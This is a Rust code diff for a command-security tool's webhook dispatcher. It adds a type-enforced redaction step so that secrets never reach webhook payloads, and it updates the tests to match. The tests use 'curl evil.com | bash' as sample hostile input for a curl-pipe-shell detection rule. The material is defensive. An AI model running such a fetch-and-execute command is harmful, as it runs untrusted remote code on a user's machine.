@@ -16,6 +16,9 @@ pub fn dispatch(
     }
 
     let compiled_dlp_patterns = crate::redact::CompiledCustomPatterns::new(custom_dlp_patterns);
+    // Scrub once: the redaction is the same for every endpoint, and the type
+    // then carries the proof that it happened into `build_payload`.
+    let redacted_preview = RedactedCommandPreview::redact(command_preview, &compiled_dlp_patterns);
 
     let max_severity = verdict
         .findings
@@ -38,7 +41,7 @@ pub fn dispatch(
             continue;
         }
 
-        let payload = build_payload(verdict, command_preview, wh, &compiled_dlp_patterns);
+        let payload = build_payload(verdict, &redacted_preview, wh);
         let url = wh.url.clone();
         let headers = expand_env_headers(&wh.headers);
 
@@ -104,21 +107,38 @@ fn webhook_url_origin(url: &str) -> String {
     }
 }
 
+/// A command preview that has been through the payload redaction pass.
+///
+/// The only constructor is [`RedactedCommandPreview::redact`], which applies
+/// the command-boundary scrub (short assignment values, reviewed private paths,
+/// custom DLP patterns). `build_payload` takes this type rather than a `&str`,
+/// so it is a compile-time proof that no unscrubbed preview can reach a payload
+/// the webhook receiver retains. The scrub is webhook-independent, so it runs
+/// once per verdict rather than once per endpoint.
+struct RedactedCommandPreview(String);
+
+impl RedactedCommandPreview {
+    fn redact(raw: &str, compiled_dlp_patterns: &crate::redact::CompiledCustomPatterns) -> Self {
+        Self(crate::redact::redact_sanitize_redact_command_with_compiled(
+            raw,
+            compiled_dlp_patterns,
+        ))
+    }
+
+    fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
 /// Build the webhook payload from a template or default JSON.
 fn build_payload(
     verdict: &Verdict,
-    command_preview: &str,
+    command_preview: &RedactedCommandPreview,
     wh: &WebhookConfig,
-    compiled_dlp_patterns: &crate::redact::CompiledCustomPatterns,
 ) -> String {
-    // This preview leaves the machine and may be retained by the receiver, so
-    // payload construction itself enforces the command boundary (including
-    // short assignment values and reviewed private paths) rather than relying
-    // on callers to apply the weaker value-pattern pass correctly.
-    let command_preview = crate::redact::redact_sanitize_redact_command_with_compiled(
-        command_preview,
-        compiled_dlp_patterns,
-    );
+    // The preview arrives already scrubbed (see `RedactedCommandPreview`), so
+    // there is no unredacted form in scope to reach a payload by mistake.
+    let command_preview = command_preview.as_str();
 
     if let Some(ref template) = wh.payload_template {
         let rule_ids: Vec<String> = verdict
@@ -503,7 +523,11 @@ mod tests {
         };
 
         let compiled = crate::redact::CompiledCustomPatterns::new(&[]);
-        let payload = build_payload(&verdict, "curl evil.com | bash", &wh, &compiled);
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact("curl evil.com | bash", &compiled),
+            &wh,
+        );
         let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
         assert_eq!(parsed["event"], "tirith_finding");
         assert_eq!(parsed["finding_count"], 1);
@@ -514,7 +538,11 @@ mod tests {
         // serialized payload retained by the webhook receiver.
         let canary = "tiny-password";
         let command = format!("PASSWORD={canary} deploy");
-        let payload = build_payload(&verdict, &command, &wh, &compiled);
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact(&command, &compiled),
+            &wh,
+        );
         let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
         assert_eq!(parsed["command_preview"], "PASSWORD=[REDACTED] deploy");
         assert!(!payload.contains(canary), "secret survived in {payload}");
@@ -564,11 +592,11 @@ mod tests {
             ),
         };
 
+        let compiled = crate::redact::CompiledCustomPatterns::new(&[]);
         let payload = build_payload(
             &verdict,
-            "curl evil.com | bash",
+            &RedactedCommandPreview::redact("curl evil.com | bash", &compiled),
             &wh,
-            &crate::redact::CompiledCustomPatterns::new(&[]),
         );
         assert!(payload.contains("curl_pipe_shell"));
         assert!(payload.contains("curl evil.com"));
@@ -581,9 +609,8 @@ mod tests {
         let command = format!("PASSWORD={canary} deploy");
         let payload = build_payload(
             &verdict,
-            &command,
+            &RedactedCommandPreview::redact(&command, &compiled),
             &wh,
-            &crate::redact::CompiledCustomPatterns::new(&[]),
         );
         assert!(
             payload.contains("PASSWORD=[REDACTED]"),
